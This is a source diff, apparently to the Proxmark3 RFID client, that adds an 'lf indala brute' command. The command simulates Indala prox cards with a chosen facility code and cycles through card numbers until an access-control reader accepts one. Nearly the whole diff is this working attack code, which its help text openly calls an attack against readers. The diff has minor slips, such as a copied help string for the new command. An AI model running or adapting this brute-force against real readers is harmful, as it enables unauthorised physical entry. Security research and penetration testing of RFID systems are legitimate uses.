@@ -37,6 +37,8 @@
 #include "cliparser.h"
 #include "cmdlfem4x05.h"  // EM defines
 #include "parity.h"       // parity
+#include "util_posix.h"
+
 #define INDALA_ARR_LEN 64
 
 static int CmdHelp(const char *Cmd);
@@ -120,6 +122,72 @@ static void decodeHeden2L(uint8_t *bits) {
 
     PrintAndLogEx(SUCCESS, "    Heden-2L    | %u", cardnumber);
 }
+
+// sending three times.  Didn't seem to break the previous sim?
+static int sendPing(void) {
+    SendCommandNG(CMD_BREAK_LOOP, NULL, 0);
+    SendCommandNG(CMD_PING, NULL, 0);
+    clearCommandBuffer();
+    PacketResponseNG resp;
+    if (WaitForResponseTimeout(CMD_PING, &resp, 1000) == false) {
+        return PM3_ETIMEOUT;
+    }
+    return PM3_SUCCESS;
+}
+
+static int sendTry(uint8_t fc, uint16_t cn, uint32_t delay, bool fmt4041x, bool verbose) {
+
+    // convert to fc / cn to binarray
+    uint8_t bs[64];
+    memset(bs, 0x00, sizeof(bs));
+
+    // Bitstream generation, format select
+    int res;
+    if (fmt4041x) {
+        res = getIndalaBits4041x(fc, cn, bs);
+    } else {
+        res = getIndalaBits(fc, cn, bs);
+    }
+
+    if (res != PM3_SUCCESS) {
+        PrintAndLogEx(ERR, "Error with tag bitstream generation.");
+        return res;
+    }
+
+    if (verbose) {
+
+        uint8_t raw[8];
+        raw[0] = bytebits_to_byte(bs, 8);
+        raw[1] = bytebits_to_byte(bs + 8, 8);
+        raw[2] = bytebits_to_byte(bs + 16, 8);
+        raw[3] = bytebits_to_byte(bs + 24, 8);
+        raw[4] = bytebits_to_byte(bs + 32, 8);
+        raw[5] = bytebits_to_byte(bs + 40, 8);
+        raw[6] = bytebits_to_byte(bs + 48, 8);
+        raw[7] = bytebits_to_byte(bs + 56, 8);
+
+        PrintAndLogEx(INFO, "Trying FC: " _YELLOW_("%u") " CN: " _YELLOW_("%u") " Raw: " _YELLOW_("%s")
+                      , fc
+                      , cn
+                      , sprint_hex_inrow(raw, sizeof(raw))
+                     );
+    }
+
+    // indala PSK,  clock 32, carrier 0
+    lf_psksim_t *payload = calloc(1, sizeof(lf_psksim_t) + sizeof(bs));
+    payload->carrier = 2;
+    payload->invert = 0;
+    payload->clock = 32;
+    memcpy(payload->data, bs, sizeof(bs));
+
+    clearCommandBuffer();
+    SendCommandNG(CMD_LF_PSK_SIMULATE, (uint8_t *)payload,  sizeof(lf_psksim_t) + sizeof(bs));
+    free(payload);
+
+    msleep(delay);
+    return sendPing();
+}
+
 
 // Indala 26 bit decode
 // by marshmellow, martinbeier
@@ -823,8 +891,145 @@ static int CmdIndalaClone(const char *Cmd) {
     return res;
 }
 
+static int CmdIndalaBrute(const char *Cmd) {
+    CLIParserContext *ctx;
+    CLIParserInit(&ctx, "lf indala brute",
+                  "Enables bruteforce of INDALA readers with specified facility code.\n"
+                  "This is a attack against reader. if cardnumber is given, it starts with it and goes up / down one step\n"
+                  "if cardnumber is not given, it starts with 1 and goes up to 65535",
+                  "lf indala brute --fc 224\n"
+                  "lf indala brute --fc 21 -d 2000\n"
+                  "lf indala brute -v --fc 21 --cn 200 -d 2000\n"
+                  "lf indala brute -v --fc 21 --cn 200 -d 2000 --up\n"
+                 );
+
+    void *argtable[] = {
+        arg_param_begin,
+        arg_lit0("v", "verbose", "verbose output"),
+        arg_u64_0(NULL, "fc", "<dec>", "facility code"),
+        arg_u64_0(NULL, "cn", "<dec>", "card number to start with"),
+        arg_u64_0("d", "delay", "<dec>", "delay betweens attempts in ms. Default 1000ms"),
+        arg_lit0(NULL, "up", "direction to increment card number. (default is both directions)"),
+        arg_lit0(NULL, "down", "direction to decrement card number. (default is both directions)"),
+        arg_lit0(NULL, "4041x", "specify Indala 4041X format"),
+        arg_param_end
+    };
+    CLIExecWithReturn(ctx, Cmd, argtable, false);
+
+    bool verbose = arg_get_lit(ctx, 1);
+
+    uint32_t fc = arg_get_u32_def(ctx, 2, 0);
+    uint32_t cn = arg_get_u32_def(ctx, 3, 0);
+
+    uint32_t delay = arg_get_u32_def(ctx, 4, 1000);
+
+    int direction = 0;
+    if (arg_get_lit(ctx, 5) && arg_get_lit(ctx, 6)) {
+        direction = 0;
+    } else if (arg_get_lit(ctx, 5)) {
+        direction = 1;
+    } else if (arg_get_lit(ctx, 6)) {
+        direction = 2;
+    }
+
+    bool fmt4041x = arg_get_lit(ctx, 7);
+    CLIParserFree(ctx);
+
+    if (verbose) {
+        PrintAndLogEx(INFO, "Wiegand format... " _YELLOW_("%s"), (fmt4041x) ? "4041x" : "Standard");
+        PrintAndLogEx(INFO, "Facility code.... " _YELLOW_("%u"), fc);
+        PrintAndLogEx(INFO, "Card number...... " _YELLOW_("%u"), cn);
+        PrintAndLogEx(INFO, "Delay............ " _YELLOW_("%d"), delay);
+        switch (direction) {
+            case 0:
+                PrintAndLogEx(INFO, "Direction........ " _YELLOW_("BOTH"));
+                break;
+            case 1:
+                PrintAndLogEx(INFO, "Direction........ " _YELLOW_("UP"));
+                break;
+            case 2:
+                PrintAndLogEx(INFO, "Direction........ " _YELLOW_("DOWN"));
+                break;
+            default:
+                break;
+        }
+    }
+    PrintAndLogEx(NORMAL, "");
+    PrintAndLogEx(INFO, "Started brute-forcing INDALA Prox reader");
+    PrintAndLogEx(INFO, "Press " _GREEN_("<Enter>") " or pm3-button to abort simulation");
+    PrintAndLogEx(NORMAL, "");
+
+    // main loop
+    // iceman:  could add options for bruteforcing FC as well..
+    uint8_t fc_hi = fc;
+    uint8_t fc_low = fc;
+    uint16_t cn_hi = cn;
+    uint16_t cn_low = cn;
+
+    bool exitloop = false;
+    bool fin_hi, fin_low;
+    fin_hi = fin_low = false;
+    do {
+
+        if (g_session.pm3_present == false) {
+            PrintAndLogEx(WARNING, "Device offline\n");
+            return PM3_ENODATA;
+        }
+
+        if (kbd_enter_pressed()) {
+            PrintAndLogEx(WARNING, "aborted via keyboard!");
+            return sendPing();
+        }
+
+        // do one up
+        if (direction != 2) {
+            if (cn_hi < 0xFFFF) {
+                if (sendTry(fc_hi, cn_hi, delay, fmt4041x, verbose) != PM3_SUCCESS) {
+                    return PM3_ESOFT;
+                }
+                cn_hi++;
+            } else {
+                fin_hi = true;
+            }
+        }
+
+        // do one down
+        if (direction != 1) {
+            if (cn_low > 0) {
+                cn_low--;
+                if (sendTry(fc_low, cn_low, delay, fmt4041x, verbose) != PM3_SUCCESS) {
+                    return PM3_ESOFT;
+                }
+            } else {
+                fin_low = true;
+            }
+        }
+
+        switch (direction) {
+            case 0:
+                if (fin_hi && fin_low) {
+                    exitloop = true;
+                }
+                break;
+            case 1:
+                exitloop = fin_hi;
+                break;
+            case 2:
+                exitloop = fin_low;
+                break;
+            default:
+                break;
+        }
+
+    } while (exitloop == false);
+
+    PrintAndLogEx(INFO, "Brute forcing finished");
+    return PM3_SUCCESS;
+}
+
 static command_t CommandTable[] = {
     {"help",     CmdHelp,            AlwaysAvailable, "This help"},
+    {"brute",    CmdIndalaBrute,     IfPm3Lf,         "Demodulate an Indala tag (PSK1) from the GraphBuffer"},
     {"demod",    CmdIndalaDemod,     AlwaysAvailable, "Demodulate an Indala tag (PSK1) from the GraphBuffer"},
     {"altdemod", CmdIndalaDemodAlt,  AlwaysAvailable, "Alternative method to demodulate samples for Indala 64 bit UID (option '224' for 224 bit)"},
     {"reader",   CmdIndalaReader,    IfPm3Lf,         "Read an Indala tag from the antenna"},
